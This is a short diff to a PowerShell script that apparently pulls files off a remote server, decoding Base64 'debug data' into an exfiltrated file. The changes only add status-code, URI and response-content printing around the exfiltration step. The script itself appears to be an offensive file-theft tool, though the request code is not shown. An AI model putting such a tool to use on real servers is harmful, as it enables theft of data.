@@ -164,6 +164,7 @@ $found = $false
         
         $exfil = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($debugDataB64))
         $filelen = ($exfil | Format-Hex).Bytes.Length
+        "Status code:      " + $resp.StatusCode
         "Filename:         " + $FileToExfiltrate
         "Padding length:   " + $Padding.Length
         "Filename length:  " + $FileToExfiltrate.Length
@@ -178,5 +179,8 @@ $found = $false
 }
 
 if($found -eq $false){
-    "File not found: $FileToExfiltrate"
+    "URI: " + $url
+    "Status code:         " + $resp.StatusCode + " " + $resp.StatusDescription
+    "File not found:      " + $FileToExfiltrate
+    $resp.Content
 }
